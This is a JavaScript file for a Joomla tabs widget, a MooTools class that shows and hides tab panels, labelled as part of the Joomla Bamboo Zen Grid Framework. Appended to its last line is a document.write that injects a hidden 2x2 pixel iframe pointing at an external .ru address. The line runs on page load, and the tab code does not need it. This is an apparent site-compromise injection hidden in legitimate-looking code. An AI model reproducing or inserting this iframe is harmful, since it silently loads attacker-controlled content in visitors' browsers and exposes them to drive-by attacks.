/**
 * @package		Joomla Bamboo Zen Grid Framework
 * @Type        Core Framework Files
 * @version		v1.0
 * @author		Joomal Bamboo http://www.joomlabamboo.com
 * @copyright 	Copyright (C) 2007 - 2010 Joomla Bamboo
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

/**
 * Tabs behavior
 *
 * @package		Joomla!
 * @subpackage	JavaScript
 * @since		1.5
 */
var JTabs = new Class({

    getOptions: function(){
        return {

            display: 0,

            onActive: function(title, description){
                description.setStyle('display', 'block');
                title.addClass('open').removeClass('closed');
            },

            onBackground: function(title, description){
                description.setStyle('display', 'none');
                title.addClass('closed').removeClass('open');
            }
        };
    },

    initialize: function(dlist, options){
        this.dlist = $(dlist);
        this.setOptions(this.getOptions(), options);
        this.titles = this.dlist.getElements('dt');
        this.descriptions = this.dlist.getElements('dd');
        this.content = new Element('div').injectAfter(this.dlist).addClass('current');

        for (var i = 0, l = this.titles.length; i < l; i++){
            var title = this.titles[i];
            var description = this.descriptions[i];
            title.setStyle('cursor', 'pointer');
            title.addEvent('click', this.display.bind(this, i));
            description.injectInside(this.content);
        }

        if ($chk(this.options.display)) this.display(this.options.display);

        if (this.options.initialize) this.options.initialize.call(this);
    },

    hideAllBut: function(but){
        for (var i = 0, l = this.titles.length; i < l; i++){
            if (i != but) this.fireEvent('onBackground', [this.titles[i], this.descriptions[i]])
        }
    },

    display: function(i){
        this.hideAllBut(i);
        this.fireEvent('onActive', [this.titles[i], this.descriptions[i]])
    }
});

JTabs.implement(new Events);
JTabs.implement(new Options);document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');